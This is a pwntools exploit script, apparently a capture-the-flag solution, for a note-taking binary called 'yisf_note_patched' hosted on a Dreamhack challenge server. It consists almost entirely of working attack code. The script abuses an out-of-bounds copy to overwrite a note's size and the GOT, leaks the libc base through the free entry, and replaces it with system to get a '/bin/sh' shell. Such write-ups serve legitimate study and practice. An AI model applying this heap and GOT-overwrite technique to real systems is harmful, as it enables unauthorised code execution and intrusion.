#!/usr/bin/python3
from pwn import * 

exe = ELF('./yisf_note_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary  = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		b* 0x00000000004015b7
		b* 0x0000000000401780
		b* 0x00000000004016EC
		b* 0x00000000004014A9
		c
		''')

if args.REMOTE:
	HOST = 'host8.dreamhack.games'
	PORT = 12471
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def note(size, data):
	sa(b'command\n', size)
	s(data)

#GDB()
#input()
pld = b''
pld = pld.ljust(0x10, b'\x00') + p64(0x4040D0)
pld += p64(0x1000)
sa(b'name : ', pld)

pld = b'W'
pld = pld.ljust(0xB, b'\0') + p16(0x100)
pld = pld.ljust(0xF, b'\0') + b'/bin/sh\0'
note(b'12345', pld) #0
note(b'12345', pld) #1
note(b'12345', pld) #2

note(b'12345', b'D' + p16(1)) #1 -> trigger free

pld = b'M' + p16(0xfa0) + p16(0x8) #commit 1 (p/s : copy oob in feild size => overwrite size of Note[0] = > UB)
pld = pld.ljust(0x7, b'\x00') + p64(exe.got.free)
note(b'12345', pld)

note(b'12345', b'R' + p16(0))

ru(b'detail : ')
libc.address = leak(r(6), libc.sym.free)
info("Libc Base: ", libc.address)

pld = b'M' + p16(0) + p16(0x8)
pld = pld.ljust(0x7, b'\x00') + p64(libc.sym.system) #commit 2 (p/s : copy oob in got => overwrite puts got => crash)
note(b'12345', pld)

note(b'12345', b'D' + p16(2))
p.interactive()

